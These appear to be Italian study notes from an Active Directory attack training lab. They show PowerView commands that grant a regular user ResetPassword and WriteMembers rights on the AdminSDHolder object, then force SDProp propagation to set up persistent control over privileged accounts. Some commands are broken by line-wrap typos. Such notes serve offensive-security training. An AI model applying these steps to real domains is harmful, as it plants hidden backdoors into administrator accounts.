# Persistence using ACLs - Editing AdminSDHolder2

* Altri permessi interessanti (ResetPassword, WriteMembers) per un utente nel AdminSDHolder

```powershell
Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc
al' -PrincipalIdentity student1 -Rights ResetPassword -
PrincipalDomain dollarcorp.moneycorp.local -TargetDomain
dollarcorp.moneycorp.local -Verbose
```

```powershell
Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc-
dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1
-Rights WriteMembers -PrincipalDomain
dollarcorp.moneycorp.local -TargetDomain
dollarcorp.moneycorp.local -Verbose
```

* Eseguire SDProp manualmente utilizzando Invoke-SDPropagator.ps1 dai tool nella directori C:\AD\Tools\\

```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

* Per macchine pre-server 2008

```powershell
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```
